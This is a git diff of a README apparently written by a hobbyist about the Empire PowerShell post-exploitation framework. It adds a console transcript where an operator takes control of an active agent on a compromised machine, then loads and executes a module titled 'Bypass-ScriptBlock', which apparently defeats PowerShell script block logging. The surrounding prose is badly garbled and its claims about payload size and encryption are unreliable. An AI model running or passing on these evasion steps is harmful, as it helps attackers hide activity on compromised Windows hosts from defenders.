@@ -36,7 +36,36 @@ Empire is a pure PowerShell post-exploitation agent built on cryptologically-sec
 ###### The number of bytes for unlimited PAyload cannot  or Be small in size Always be very large size like Payloads Meterprter Features of Enlarge Volume Encryption Payload of protections the Windows This is one of the reasons
 --------------
 
+
 ### Now note to define some From Module Empire-PN My ::)!
 -----------------------------
 
    ###### Bypass-ScriptBlock.ps1 
+   ```
+   ================================================================
+ [Empire]  Post-Exploitation Framework
+================================================================
+ [Version] 2.0 | [Web] https://theempire.io
+================================================================
+
+   _______ .___  ___. .______    __  .______       _______
+  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
+  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
+  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
+  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
+  |_______||__|  |__| | _|      |__| | _| `._____||_______|
+
+
+       271 modules currently loaded
+
+       1 listeners currently active
+
+       1 agents currently active
+
+
+(Empire) > interact Homjxi0e
+(Homjxi0e) > usemodule management/ScriptBlock
+(Empire: powershell/management/ScriptBlock) > set Agent Homjxi0e
+(Empire: powershell/management/ScriptBlock) > execute 
+
+  ```
